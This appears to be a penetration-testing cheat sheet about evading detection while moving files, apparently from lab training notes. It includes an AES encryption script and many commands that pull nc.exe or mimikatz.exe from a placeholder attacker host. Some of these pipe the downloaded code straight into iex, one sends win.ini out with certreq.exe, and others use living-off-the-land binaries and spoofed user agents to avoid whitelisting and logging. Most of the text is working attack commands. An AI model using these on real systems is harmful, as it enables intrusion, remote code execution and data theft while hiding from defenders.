---
title: Evading detection in file transfers
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - evading detection
  - exploitation
  - file transfer technique
  - backdoors
---
# Evading detection in file transfers

Encrypting the data or files before a transfer is often necessary to prevent the data from being read if intercepted in transit.

## Windows

### File Encryption on Windows: Invoke-AESEncryption.ps1

Download it from: https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1 Also, see the code snippet below.

```powershell
<#  
.SYNOPSIS  
Encryptes or Decrypts Strings or Byte-Arrays with AES  
   
.DESCRIPTION  
Takes a String or File and a Key and encrypts or decrypts it with AES256 (CBC)  
   
.PARAMETER Mode  
Encryption or Decryption Mode  
   
.PARAMETER Key  
Key used to encrypt or decrypt  
   
.PARAMETER Text  
String value to encrypt or decrypt  
   
.PARAMETER Path  
Filepath for file to encrypt or decrypt  
   
.EXAMPLE  
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Text "Secret Text"  
   
Description  
-----------  
Encrypts the string "Secret Test" and outputs a Base64 encoded cipher text.  
   
.EXAMPLE  
Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Text "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs="  
   
Description  
-----------  
Decrypts the Base64 encoded string "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs=" and outputs plain text.  
   
.EXAMPLE  
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Path file.bin  
   
Description  
-----------  
Encrypts the file "file.bin" and outputs an encrypted file "file.bin.aes"  
   
.EXAMPLE  
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Path file.bin.aes  
   
Description  
-----------  
Decrypts the file "file.bin.aes" and outputs an encrypted file "file.bin"  
#>  
function Invoke-AESEncryption {  
    [CmdletBinding()]  
    [OutputType([string])]  
    Param  
    (  
        [Parameter(Mandatory = $true)]  
        [ValidateSet('Encrypt', 'Decrypt')]  
        [String]$Mode,  
  
        [Parameter(Mandatory = $true)]  
        [String]$Key,  
  
        [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]  
        [String]$Text,  
  
        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]  
        [String]$Path  
    )  
  
    Begin {  
        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed  
        $aesManaged = New-Object System.Security.Cryptography.AesManaged  
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC  
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros  
        $aesManaged.BlockSize = 128  
        $aesManaged.KeySize = 256  
    }  
  
    Process {  
        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))  
  
        switch ($Mode) {  
            'Encrypt' {  
                if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}  
                  
                if ($Path) {  
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue  
                    if (!$File.FullName) {  
                        Write-Error -Message "File not found!"  
                        break  
                    }  
                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)  
                    $outPath = $File.FullName + ".aes"  
                }  
  
                $encryptor = $aesManaged.CreateEncryptor()  
                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)  
                $encryptedBytes = $aesManaged.IV + $encryptedBytes  
                $aesManaged.Dispose()  
  
                if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}  
                  
                if ($Path) {  
                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)  
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime  
                    return "File encrypted to $outPath"  
                }  
            }  
  
            'Decrypt' {  
                if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}  
                  
                if ($Path) {  
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue  
                    if (!$File.FullName) {  
                        Write-Error -Message "File not found!"  
                        break  
                    }  
                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)  
                    $outPath = $File.FullName -replace ".aes"  
                }  
  
                $aesManaged.IV = $cipherBytes[0..15]  
                $decryptor = $aesManaged.CreateDecryptor()  
                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)  
                $aesManaged.Dispose()  
  
                if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}  
                  
                if ($Path) {  
                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)  
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime  
                    return "File decrypted to $outPath"  
                }  
            }  
        }  
    }  
  
    End {  
        $shaManaged.Dispose()  
        $aesManaged.Dispose()  
    }  
}
```

After the script has been transferred, it only needs to be imported as a module, as shown below.

```powershell-session
Import-Module .\Invoke-AESEncryption.ps1
```

This command creates an encrypted file with the same name as the encrypted file but with the extension "`.aes`."

```powershell-session
Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt
```


### Bitsadmin

The [Background Intelligent Transfer Service (BITS)](https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal) can be used to download files from HTTP sites and SMB shares. It "intelligently" checks host and network utilization into account to minimize the impact on a user's foreground work.

Download a file:

```powershell-session
PS C:\htb> bitsadmin /transfer wcb /priority foreground http://$ipAttacker:$portAttacker/nc.exe C:\Users\htb-student\Desktop\nc.exe
```

```powershell-session
PS C:\htb> Import-Module bitstransfer;
PS C:\htb> Start-BitsTransfer 'http://$ipAttacker:$portAttacker/nc.exe' $env:temp\t;
PS C:\htb> $r=gc $env:temp\t;
PS C:\htb> rm $env:temp\t; 
PS C:\htb> iex $r
```



### Certutil

Certutil can be used to download arbitrary files. It is available in all Windows versions and has been a popular file transfer technique, serving as a defacto wget for Windows. However, the Antimalware Scan Interface (AMSI) currently detects this as malicious Certutil usage.

Download a file:

```cmd-session
C:\htb> certutil.exe -verifyctl -split -f http://$ipAttacker:$portAttacker/nc.exe

C:\htb> certutil -urlcache -split -f http://$ipAttacker:$portAttacker/nc.exe 
C:\htb> certutil -verifyctl -split -f http://$ipAttacker:$portAttacker/nc.exe


```

###  Invoke-WebRequest

In the attacker's machine:

```
nc -lnvp $port
```

In the  victim's machine:

```powershell-session
PS C:\htb> Invoke-WebRequest http://$ipAttacker:$portAttacker/nc.exe -OutFile "C:\Users\Public\nc.exe" 

PS C:\htb> Invoke-RestMethod http://$ipAttacker:$portAttacker/nc.exe -OutFile "C:\Users\Public\nc.exe"
```


### WinHttpRequest

In the attacker's machine:

```
nc -lnvp $port
```

In the  victim's machine:

```powershell-session
PS C:\htb> $h=new-object -com WinHttp.WinHttpRequest.5.1;

PS C:\htb> $h.open('GET','http://$ipAttacker:$portAttacker/nc.exe',$false);
PS C:\htb> $h.send();
PS C:\htb> iex $h.ResponseText
```


### Msxml2

In the attacker's machine:

```
nc -lnvp $port
```

In the  victim's machine:

```powershell-session
PS C:\htb> $h=New-Object -ComObject Msxml2.XMLHTTP;
PS C:\htb> $h.open('GET','http://$ipAttacker:$portAttacker/nc.exe',$false);
PS C:\htb> $h.send();
PS C:\htb> iex $h.responseText
```



## Linux

### File Encryption on Linux: Encrypting /etc/passwd with openssl

```shell-session
openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
```

**Decrypt passwd.enc with openssl**

```shell-session
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
```


### openssl

Create a certificate in the attacker's machine:

```shell-session
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
```

Launch the openssl server in the attacker's machine:

```shell-session
openssl s_server -quiet -accept $portAttacker -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```

Next, with the server running, we need to download the file from the compromised machine. So, download the file from the victim's machine:

```shell-session
openssl s_client -connect $ipAttacker:$portAttacker -quiet > LinEnum.sh
```

## LOLBAS / GTFOBins

- [LOLBAS Project for Windows Binaries](https://lolbas-project.github.io/)
- [GTFOBins for Linux Binaries](https://gtfobins.github.io/)

Application whitelisting may prevent you from using PowerShell or Netcat, and command-line logging may alert defenders to your presence. In this case, an option may be to use a "LOLBIN" (living off the land binary), alternatively also known as "misplaced trust binaries."


### GfxDownloadWrapper.exe

An example LOLBIN is the Intel Graphics Driver for Windows 10 (GfxDownloadWrapper.exe), installed on some systems and contains functionality to download configuration files periodically. This download functionality can be invoked as follows:

```powershell
GfxDownloadWrapper.exe "http://$ipAttacker:$portAttacker/mimikatz.exe" "C:\Temp\nc.exe"
```


Such a binary might be permitted to run by application whitelisting and be excluded from alerting.

### certreq.exe

Upload win.init to our attacker's machine

Attacker machine

```bash
sudo nc -lnvp $portAttacker
```

Victim's machine: 

```cmd-session
certreq.exe -Post -config http://$ipAttacker:$portAttacker/ c:\windows\win.ini
```

If you get an error when running `certreq.exe`, the version you are using may not contain the `-Post` parameter. You can download an updated version [here](https://github.com/juliourena/plaintext/raw/master/hackthebox/certreq.exe) and try again.


## Changing User Agent

### Request with Invoke-WebRequest and Chrome User agent

If administrators or defenders have blacklisted any of these User Agents, [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.1) contains a UserAgent parameter, which allows for changing the default user agent

Listing user agents: 

```powershell
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
```

Results: 

```txt
Name       : InternetExplorer
User Agent : Mozilla/5.0 (compatible; MSIE 9.0; Windows NT; Windows NT 10.0; en-US)

Name       : FireFox
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) Gecko/20100401 Firefox/4.0

Name       : Chrome
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0
             Safari/534.6

Name       : Opera
User Agent : Opera/9.70 (Windows NT; Windows NT 10.0; en-US) Presto/2.2.1

Name       : Safari
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0
             Safari/533.16
```


Using Chrome User Agent:

```powershell
Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "C:\Users\Public\nc.exe"
```

```shell-session
nc -lvnp 80
```


